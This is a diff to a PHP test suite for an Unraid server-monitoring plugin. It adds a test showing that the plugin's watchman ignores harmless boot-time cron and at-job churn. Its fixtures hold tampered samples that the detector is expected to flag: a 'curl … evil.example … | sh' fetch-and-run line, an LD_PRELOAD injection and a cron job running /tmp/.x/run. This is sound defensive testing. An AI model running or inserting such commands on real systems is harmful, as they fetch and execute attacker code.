@@ -16921,6 +16921,182 @@ function testWatchmanAtPlugin(): void
 }
 
 /**
+ * The night shift at boot (2026-10-22, the owner's server after a power-off): Unraid installs the plugins one after the
+ * other and starts emhttpd after them — meanwhile a plugin's .cron is written anew (empty a moment), its plugin isn't
+ * installed yet, and ich777's Plugin-Update-Helper is queued through atd. None of it is news; a plugin's .cron is
+ * judged by its lines (empty or gone a moment, then the same lines: nothing), and entries of it from before close at
+ * the next look.
+ */
+function testWatchmanBootNoise(): void
+{
+    $now = strtotime('2026-10-22 10:00:00');
+    $tmp = sys_get_temp_dir() . '/office-tests-bootnoise-' . getmypid();
+    $src = "$tmp/src";
+    $day = "$tmp/data/watchman";
+    $night = "$tmp/run/nightshift";
+    $ram = "$tmp/run/watchman-mirror.json";
+    $flash = "$tmp/flashmirror/watchman-mirror.json";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh', 'flash/user.scripts/scripts/Sicherung', 'flash/nvidia-driver',
+              'emhttp/nvidia-driver', 'proc/1', 'proc/2', 'usrbin', 'aside'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    @mkdir("$tmp/run", 0700, true);
+    @mkdir("$tmp/flashmirror", 0700, true);
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d",
+              'cron_files' => "$src/flash", 'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents",
+              'emhttp_plugins' => "$src/emhttp", 'update_helper' => "$src/usrbin/plugin_update_helper", 'emhttpd' => "$src/proc", 'boot_id' => "$tmp/boot_id"];
+    $boot1 = 'bbbbbbbb-0000-4000-8000-000000000001';
+    $boot2 = 'bbbbbbbb-0000-4000-8000-000000000002';
+    file_put_contents("$tmp/boot_id", "$boot1\n");
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp\n");
+    file_put_contents($paths['syslog'], '');
+    file_put_contents("$src/cron.d/root", "*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n");
+    file_put_contents("$src/crontabs/root", "# nothing of root's own\n");
+    foreach (['unraid-secretary-office', 'user.scripts', 'nvidia-driver'] as $p) {
+        file_put_contents("$src/logplugins/$p.plg", "<PLUGIN name=\"$p\" version=\"2026.10.01\" pluginURL=\"https://raw.githubusercontent.com/someone/$p/master/$p.plg\">\n");
+    }
+    file_put_contents("$src/emhttp/nvidia-driver/README.md", "**Nvidia Driver**\n");
+    $cronFile = "$src/flash/user.scripts/customSchedule.cron";
+    $cron = "# Generated cron schedule for user.scripts\n"
+          . "0 4 * * * /usr/local/emhttp/plugins/user.scripts/startCustom.php /boot/config/plugins/user.scripts/scripts/Sicherung/script > /dev/null 2>&1\n\n";
+    file_put_contents($cronFile, $cron);
+    file_put_contents("$src/flash/user.scripts/scripts/Sicherung/script", "#!/bin/bash\necho Familienfilme\n");
+    $helper = "#!/bin/bash\n# Plugin-Update-Helper version: 2023.06.01\n# by ich777\ninotifywait -q /boot/changes.txt -e move_self,delete_self\n";
+    file_put_contents("$src/flash/nvidia-driver/plugin_update_helper", $helper);
+    file_put_contents($paths['update_helper'], $helper);
+    file_put_contents("$src/proc/1/comm", "init\n");
+    file_put_contents("$src/proc/2/comm", "emhttpd\n");
+    // atd's job as the helper's plugin queues it (echo "/usr/bin/plugin_update_helper" | at now -M), from rc.local at boot
+    $head = fn (int $uid = 0) => "#!/bin/sh\n# atrun uid=$uid gid=0\n# mail root 0\numask 22\nSHELL=/bin/bash; export SHELL\nPWD=/; export PWD\n"
+        . "HOME=/root; export HOME\nPATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin; export PATH\n"
+        . "cd / || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
+    $wrap = fn (string $cmds) => "\${SHELL:-/bin/sh} << 'marcinDELIMITER3a2b1c0d'\n$cmds\nmarcinDELIMITER3a2b1c0d\n";
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+    $openKeys = function (array $book): array {
+        $k = array_column(array_values(array_filter($book, 'watchmanOpen')), 'key');
+        sort($k);
+        return $k;
+    };
+
+    // the pieces: emhttpd up (at boot: the plugins installed); the helper's job and whose copy it is
+    same('boot: emhttpd up — the plugins are installed; not looked at — yes', [true, true],
+        [watchmanBootPluginsDone($paths), watchmanBootPluginsDone(array_diff_key($paths, ['emhttpd' => 1]))]);
+    file_put_contents("$src/proc/2/comm", "rc.local\n");
+    same('boot: no emhttpd yet — Unraid still installs the plugins', false, watchmanBootPluginsDone($paths));
+    file_put_contents("$src/proc/2/comm", "emhttpd\n");
+    same('helper: the installed plugin whose copy /usr/bin/plugin_update_helper is', 'nvidia-driver', watchmanUpdateHelper($paths));
+    same('helper: its job exactly (as root, an environment that runs nothing else)', [true, false, false, false, false],
+        [watchmanAtHelperJob($head() . $wrap(WATCH_UPDATE_HELPER)), watchmanAtHelperJob($head(1000) . $wrap(WATCH_UPDATE_HELPER)),
+         watchmanAtHelperJob($head() . $wrap(WATCH_UPDATE_HELPER . '; curl -s https://evil.example/x | sh')),
+         watchmanAtHelperJob($head() . $wrap('/tmp/plugin_update_helper')),
+         watchmanAtHelperJob(str_replace("PWD=/; export PWD\n", "LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n", $head()) . $wrap(WATCH_UPDATE_HELPER))]);
+    file_put_contents($paths['update_helper'], $helper . "curl -s https://evil.example/x | sh\n");
+    $other = watchmanUpdateHelper($paths);
+    rename("$src/logplugins/nvidia-driver.plg", "$src/aside/nvidia-driver.plg");
+    file_put_contents($paths['update_helper'], $helper);
+    same('helper: not a plugin\'s copy (another content), or its plugin not installed — none', [null, null], [$other, watchmanUpdateHelper($paths)]);
+    rename("$src/aside/nvidia-driver.plg", "$src/logplugins/nvidia-driver.plg");
+
+    // the day: he takes over; his baseline goes to the flash for the night shift
+    watchmanRound($paths, $day, 1000, $now, $docker, false, $acks);
+    $r = watchmanRound($paths, $day, 1000, $now + 300, $docker, false, $acks);
+    same('boot: the day — the plugin\'s schedule known, nothing new', [[], 'flash'], [$r['added'], watchmanMirrorWrite($day, $ram, $flash, $now + 300, $boot1)]);
+
+    // a power-off and a boot: no RAM mirror; rc.local installs the office's plugin first (the night shift starts with it),
+    // user.scripts after it (writing its .cron anew: empty a moment, then the same lines), then ich777's plugin (the helper
+    // into /usr/bin, its job queued); emhttpd only after all of them
+    @unlink($ram);
+    file_put_contents("$tmp/boot_id", "$boot2\n");
+    $t = $now + 7200;
+    rename("$src/logplugins/user.scripts.plg", "$src/aside/user.scripts.plg");
+    rename("$src/logplugins/nvidia-driver.plg", "$src/aside/nvidia-driver.plg");
+    unlink($paths['update_helper']);
+    touch($paths['plugins'], $t - 10);
+    file_put_contents("$src/proc/2/comm", "rc.local\n");
+    file_put_contents($cronFile, '');
+    touch($cronFile, $t);
+    $r1 = watchmanNightRound($paths, $night, $t, false, $docker, $ram, $flash, $boot2);
+    file_put_contents($cronFile, $cron);
+    touch($cronFile, $t + 30);
+    $r2 = watchmanNightRound($paths, $night, $t + 300, false, $docker, $ram, $flash, $boot2);
+    rename("$src/aside/user.scripts.plg", "$src/logplugins/user.scripts.plg");
+    rename("$src/aside/nvidia-driver.plg", "$src/logplugins/nvidia-driver.plg");
+    touch($paths['plugins'], $t + 400);
+    file_put_contents($paths['update_helper'], $helper);
+    file_put_contents("$src/atjobs/a0000901cc2a6c", $head() . $wrap(WATCH_UPDATE_HELPER));
+    touch($paths['atjobs'], $t + 410);
+    file_put_contents("$src/proc/2/comm", "emhttpd\n");
+    $r3 = watchmanNightRound($paths, $night, $t + 600, false, $docker, $ram, $flash, $boot2);
+    $book = watchmanLoad($night)['book'];
+    $pl = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_plugin'));
+    same('boot: nothing new — not while the plugins install, not after (no schedule changed, none of no plugin, no foreign at job)',
+        ['flash', [], [], [], []], [$r1['begun']['from'] ?? null, $r1['added'], $r2['added'], $r3['added'], $openKeys($book)]);
+    same('boot: the helper\'s job — a line noted by himself, naming the plugin whose copy it is',
+        [1, 'nvidia-driver', 'Nvidia Driver', WATCH_UPDATE_HELPER, 'plugin', false],
+        [count($pl), $pl[0]['p']['plugin'] ?? null, $pl[0]['p']['name'] ?? null, $pl[0]['p']['file'] ?? null, $pl[0]['by'] ?? null, watchmanOpen($pl[0] ?? [])]);
+    same('boot: nothing for the team lead', [], array_column(watchmanFindings($book), 'id'));
+    unlink("$src/atjobs/a0000901cc2a6c");
+    touch($paths['atjobs'], $t + 700);
+
+    // the day again: a plugin writes its .cron anew while he looks — empty, gone, back with the same lines: no news; the
+    // lines that went are remembered (in the flash's mirror too: hashes and times); a new line is told
+    $d = $t + 1000;
+    $round = function (int $at) use ($paths, $day, $docker, $acks): array {
+        return watchmanRound($paths, $day, 1000, $at, $docker, false, $acks)['added'];
+    };
+    file_put_contents($cronFile, "# Generated cron schedule for user.scripts\n");
+    touch($cronFile, $d);
+    $emptied = $round($d + 10);
+    $was = watchmanMirror(watchmanLoad($day), $boot2, $d + 20, true)['baseline']['sched']['files']['user.scripts/customSchedule.cron']['was'] ?? [];
+    unlink($cronFile);
+    $gone = $round($d + 300);
+    $goneKnown = watchmanLoad($day)['baseline']['sched']['files']['user.scripts/customSchedule.cron']['gone'] ?? null;
+    $page = watchmanPageState($day, $d + 310, false);
+    file_put_contents($cronFile, $cron);
+    touch($cronFile, $d + 400);
+    $back = $round($d + 600);
+    same('cron file: emptied, gone, back with the same lines — no news; gone it is known still, not on the page', [[], [], [], [$d + 10], $d + 300, false],
+        [$emptied, $gone, $back, array_values($was), $goneKnown,
+         in_array('user.scripts/customSchedule.cron', array_column((array) ($page['watch']['sched']['files'] ?? []), 'file'), true)]);
+    file_put_contents($cronFile, $cron . "*/5 * * * * /tmp/.x/run\n");
+    touch($cronFile, $d + 700);
+    $added = $round($d + 900);
+    file_put_contents($cronFile, $cron);
+    touch($cronFile, $d + 1000);
+    $round($d + 1200);
+    $e = array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => ($e['key'] ?? '') === 'cron_file:user.scripts/customSchedule.cron'));
+    same('cron file: a new line is told; the file as before again — the entry closed by himself (back)', [['cron_file'], ['*/5 * * * * /tmp/.x/run'], 'back', false],
+        [$added, $e[0]['p']['jobs'] ?? null, $e[0]['by'] ?? null, watchmanOpen($e[0] ?? [])]);
+
+    // the owner's server: the three entries the night shift's look during the boot left open (before this fix) close at the next look
+    $old = watchmanLoad($day);
+    $stale = [watchmanEntry('cron_file', 'cron_file:user.scripts/customSchedule.cron', $t + 200, ['file' => 'user.scripts/customSchedule.cron', 'plugin' => 'user.scripts',
+                  'new' => false, 'office' => false, 'lines' => 1, 'jobs' => ['0 4 * * * user.scripts/startCustom.php …'], '_f' => 'x']),
+              watchmanEntry('cron_file_foreign', 'cron_file_foreign:user.scripts/customSchedule.cron', $t + 100, ['file' => 'user.scripts/customSchedule.cron',
+                  'plugin' => 'user.scripts', 'new' => false, 'office' => false, 'lines' => 1, 'jobs' => [], '_f' => 'x']),
+              watchmanEntry('at_job', 'at_job:a0000901cc2a6c', $t + 300, ['job' => 'a0000901cc2a6c', 'when' => $t, 'cmd' => WATCH_UPDATE_HELPER, 'uid' => 0]),
+              watchmanEntry('at_job', 'at_job:a0000a01cc2a6c', $t + 300, ['job' => 'a0000a01cc2a6c', 'when' => $t, 'cmd' => WATCH_UPDATE_HELPER, 'uid' => 1000])];
+    watchmanSave($day, $old, ['book' => array_merge($old['book'], $stale)]);
+    same('stale: open before the look', 4, count(array_filter(watchmanLoad($day)['book'], fn ($e) => watchmanOpen($e) && ($e['time'] ?? 0) < $d)));
+    $r = watchmanRound($paths, $day, 1000, $d + 1500, $docker, false, $acks);
+    $byKey = array_column(watchmanLoad($day)['book'], null, 'key');
+    same('stale: the schedule as he knows it — both closed (back); the helper\'s job as root closed (plugin); not as root it stays',
+        [[], 'back', 'back', 'plugin', null, ['at_job:a0000a01cc2a6c']],
+        [$r['added'], $byKey['cron_file:user.scripts/customSchedule.cron']['by'] ?? null, $byKey['cron_file_foreign:user.scripts/customSchedule.cron']['by'] ?? null,
+         $byKey['at_job:a0000901cc2a6c']['by'] ?? null, $byKey['at_job:a0000a01cc2a6c']['by'] ?? null, $openKeys(watchmanLoad($day)['book'])]);
+
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($day, 'book'));
+    @unlink(watchmanLockFile($night, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
  * The night watchman's watch over what starts on its own: root's own crontab next to Unraid's (new
  * lines, lines in both, the office's own lines, programs gone, the syslog as evidence), the plugins'
  * .cron files, User Scripts, atd's queue, the notification agents — all on copies in a temporary folder.
@@ -50349,7 +50525,7 @@ $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlan
                       'testMoverelliFit', 'testMoverelliIni', 'testMoverelliIniTolerant', 'testMoverelliMoveBin', 'testMoverelliRun', 'testMoverelliGates', 'testMoverelliForeign', 'testMoverelliPage', 'testRefusedRowWords', 'testMoverelliImport', 'testNightPlan', 'testNightRun', 'testNightOrder', 'testNightHerPool', 'testNightPicture', 'testMoverelliRunPicture', 'testNightJackCard', 'testNightJackInHerCard', 'testNightSteps', 'testNightReserve', 'testNightSnaps', 'testPoolJackOutside', 'testPoolNonZfs', 'testMoverelliSharesGone', 'testMoverelliTiles', 'testMoverelliSuggestJack', 'testMoverelliUnraid', 'testMoverelliStop', 'testMoverelliArrayStop', 'testMoverelliPowerCut', 'testMoverelliNothingMoved', 'testMoverelliCardLag', 'testMoverelliCardFile', 'testMoverelliLeftWhy', 'testMoverelliSyncMoved', 'testMoverelliTwins', 'testMoverelliEta', 'testMoverelliPreferDisks', 'testMoverelliTidy', 'testMoverelliShareRoot', 'testMoverelliTrailingSpace', 'testMoverelliFuture', 'testMoverelliLeftCodesPage', 'testOfficeFmtSize', 'testMoverelliIdleRules', 'testMoverelliPageTruth', 'testGreetTruth', 'testMoverelliFill', 'testPoolLevel', 'testPoolBytes', 'testStreamerTab', 'testJackRemoveServer', 'testJackSaveReconnect', 'testJackConnectNoChange', 'testJackByWords', 'testStreamerBudget', 'testStreamerReset', 'testStreamerFix3', 'testStreamerShares', 'testJackYield',
                       'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupNotifyLang', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testPartnerEnded', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testRestoreShares', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testRestorePartner', 'testPartnerTicket', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testLogsRules', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testLogsWakes', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereVmMigratable', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereBuilding', 'testCleanupTick', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testHireNeeds', 'testMovedDesk', 'testMigrateJackId', 'testMigrateMediaCache', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testLookOldRun', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testWatchmanApiDoor', 'testCaretakerApi', 'testCaretakerNetworks', 'testSetupMessages', 'testDriftCodes', 'testIconStacks', 'testPartnerPairing', 'testPartnerWatch', 'testPartnerGone', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testBackupPairsReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testPlgInstall', 'testWatchmanRoundWait', 'testPlgRemove', 'testBackupLetGo', 'testBackupAbortAsked', 'testJackSetupFresh', 'testApiGetOffline', 'testSupporterList', 'testReportDialogImages', 'testReportDialogDiagnostics',
-                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testSnapPoolSplit', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages'],
+                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanBootNoise', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testSnapPoolSplit', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages'],
           'hardening' => ['testRequestTypes', 'testFirstHome', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testAgentClock', 'testAgentZone', 'testHouseDockerSilent', 'testDockerGuard', 'testNotifyToldLately', 'testHostLaunchAtd', 'testCleanupStoreroomDisks', 'testSnapshotRecord', 'testTrashManifest', 'testJackPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testReport', 'testReportImages', 'testReportDiagnostics', 'testReportSlots', 'testReportDiagScrub', 'testReportStatus', 'testReportInbox', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim'],
           'strings' => ['testStrings', 'testUnraidWords', 'testNoNightWords']];
 // php tests/run.php [<part>|<test> …] — no name: everything; else every named part and test, each once, in the order of
